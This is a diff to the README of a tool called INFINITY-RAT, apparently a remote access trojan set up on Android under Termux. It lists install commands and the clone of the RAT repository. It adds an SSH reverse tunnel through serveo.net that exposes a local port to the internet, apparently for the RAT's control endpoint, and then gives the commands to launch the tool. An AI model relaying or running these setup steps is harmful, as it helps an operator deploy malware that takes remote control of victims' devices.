@@ -40,21 +40,31 @@
  ●𝙲𝚘𝚗𝚗𝚎𝚌𝚝 > 𝙳𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝 > 𝙲𝚘𝚗𝚗𝚎𝚌𝚝
 ```
 ## install Tool
+
 ```bash
 pkg update -y
 pkg upgrade -y
 apt-get install python -y
 apt-get install git -y
+apt-get install openssh -y
 apt-get install nodejs -y
 pip install requests
 git clone https://github.com/infinitynetwork13/INFINITY-RAT.git
+```
+- SSH
+```
+ssh -R 80:localhost:9999 serveo.net
+```
+`(yes/no/fingerprint) yes`
+## Past Time Run
+```
 cd INFINITY-RAT
 bash install.sh
 ```
-## OTHER TIME RUN
+## Other Time Run
 ```bash
 cd INFINITY-RAT
 python infinity.py
 ```
 ## CONTACT
-<a><img src="https://github.com/infinitynetwork13/INFINITY-RAT/assets/155347164/4acb85cb-3cf9-4e37-9d69-ce0e113be140"></img></a>
+<a><img width="20px" src="https://github.com/infinitynetwork13/INFINITY-RAT/assets/155347164/4acb85cb-3cf9-4e37-9d69-ce0e113be140"></img></a>
